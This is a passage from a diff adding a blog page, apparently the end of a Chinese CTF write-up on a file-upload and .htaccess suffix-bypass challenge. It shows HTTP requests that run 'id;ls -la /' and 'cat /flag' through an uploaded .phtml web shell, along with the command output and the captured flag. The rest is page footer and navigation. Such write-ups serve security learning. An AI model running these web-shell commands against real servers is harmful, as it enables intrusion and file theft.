+<h2 id="执行命令，拿-flag"><a href="#执行命令，拿-flag" class="headerlink" title="执行命令，拿 flag"></a>执行命令，拿 flag</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /uplo4d/79c93a6bf07761fcc2a020e149f3fc60.phtml?c=id;ls -la /</span><br></pre></td></tr></table></figure>
+
+<p>回显：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">...</span><br><span class="line">-rw-r--r-- 1 root root 43 ... flag</span><br></pre></td></tr></table></figure>
+
+<p>Web 根目录里没有 flag，<code>/flag</code> 就在根目录下。直接读：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET ...phtml?c=cat /flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;a7836b1e-c8a2-4ce8-9678-1081b58f447c&#125;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行成功，题目结束。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
+              <a href="/tags/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" rel="tag"># 后缀绕过</a>
+              <a href="/tags/htaccess/" rel="tag"># .htaccess</a>
+              <a href="/tags/ACTF/" rel="tag"># ACTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/24/web-knowledge-upload-basics/" rel="prev" title="文件上传基础：校验点、可执行后缀与常见坑">
+                  <i class="fa fa-angle-left"></i> 文件上传基础：校验点、可执行后缀与常见坑
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/10/24/web-ctf-upload-geek2019/" rel="next" title="[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过">
+                  [极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Quellisya</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/Quellisya" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
